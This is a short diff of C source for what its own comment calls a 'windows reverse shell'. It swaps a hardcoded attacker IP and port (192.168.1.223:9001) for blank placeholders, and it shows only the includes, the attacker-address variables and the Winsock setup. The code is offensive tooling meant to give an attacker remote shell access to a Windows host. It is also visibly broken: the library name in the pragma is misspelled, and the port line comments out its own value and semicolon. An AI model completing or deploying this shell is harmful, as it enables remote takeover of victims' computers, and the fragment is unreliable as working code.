@@ -1,3 +1,6 @@
+//windows reverse shell
+
+
 #include <winsock2.h>
 #include <stdio.h>
 #pragma comment(lib, "w2,_32")
@@ -12,8 +15,8 @@ int main(int argc, char* argv[])
 {
     //attackers ports
 
-    char *ip = "192.168.1.223";
-    short port = 9001;
+    char *ip = ""; //Enter IP
+    short port = //port;
 
     //initialize socket lib
     WSAStartup(MAKEWORD(2, 2), &wsaData);
